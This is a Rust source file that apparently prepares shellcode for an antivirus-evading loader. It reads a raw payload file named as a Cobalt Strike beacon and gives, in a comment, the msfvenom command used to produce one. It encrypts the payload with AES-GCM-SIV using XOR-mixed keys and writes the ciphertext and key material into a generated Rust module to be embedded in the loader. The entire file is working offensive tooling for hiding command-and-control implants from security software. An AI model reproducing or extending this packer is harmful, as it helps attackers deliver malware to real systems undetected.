use std::error::Error;
use rand::Rng;
use aes_gcm_siv::{aead::{Aead, KeyInit} ,Aes256GcmSiv, Key, Nonce};

// msfvenom --platform windows -a x64 -p windows/x64/exec CMD=calc.exe -b '\x00\x0a\x0d\x20' -f raw -o calc_win_x64.raw
// const RAW_SC: &str = "calc_win_x64.raw";     // 弹出计算器
// const RAW_SC: &str = "https_x64_50143_stageless_indirect_xthread.bin";
const RAW_SC: &str = "cs_payload_x64.bin";

/// aes-gcm-siv 加密
/// data - [u8]
/// key - [u8;32]
/// nonce - [u8;12]
fn aes_gcm_siv_enc(data: &[u8], key: &[u8], nonce: &[u8]) -> Result<Vec<u8>,Box<dyn Error>> {
    let key: &Key<Aes256GcmSiv> = key.into();
    let cipher = Aes256GcmSiv::new(&key);
    let nonce = Nonce::from_slice(nonce);
    let ciphertext = cipher.encrypt(nonce, data).unwrap();
    // println!("aes_gcm_siv_enc {:?}",ciphertext);
    Ok(ciphertext)
}
fn main() {

    let raw_shellcode = std::fs::read(RAW_SC).expect("Error in reading the file");

    let mut rng = rand::thread_rng();

    let key: [u8; 32] = rng.gen();
    let nonce: [u8; 12] = rng.gen();
    let mix: [u8; 32] = rng.gen();

    // 混淆
    let newnonce: [u8; 12] = nonce
        .into_iter()
        .zip(key)
        .map(|(a, b)| a ^ b ^ 5 << 1)
        .collect::<Vec<u8>>()
        .as_slice()
        .try_into()
        .unwrap();
    let newkey: [u8; 32] = key
        .into_iter()
        .zip(mix)
        .map(|(a, b)| a ^ b ^ 5 >> 1)
        .collect::<Vec<u8>>()
        .as_slice()
        .try_into()
        .unwrap();

    let ciphertext = aes_gcm_siv_enc(raw_shellcode.as_slice(), &newkey, &newnonce).unwrap();
    // println!("加密后{:?}",ciphertext);
    dbg!(ciphertext.clone());

    let a = ciphertext
        .iter()
        .map(|b| format!("{}", b).to_string())
        .collect::<Vec<String>>()
        .join(", ");

    let b = key
        .iter()
        .map(|b| format!("{}", b).to_string())
        .collect::<Vec<String>>()
        .join(", ");

    let c = nonce
        .iter()
        .map(|b| format!("{}", b).to_string())
        .collect::<Vec<String>>()
        .join(", ");

    let d = mix
        .iter()
        .map(|b| format!("{}", b).to_string())
        .collect::<Vec<String>>()
        .join(", ");

    let filedata = format!(
        "pub fn getdata()->(Vec<u8>, Vec<u8>,Vec<u8>, Vec<u8>){{
        (vec![{}],
        vec![{}],vec![{}],vec![{}])
    }}",
        a, b, c, d
    );

    std::fs::write("src/data_tmp.rs", filedata).unwrap();
}
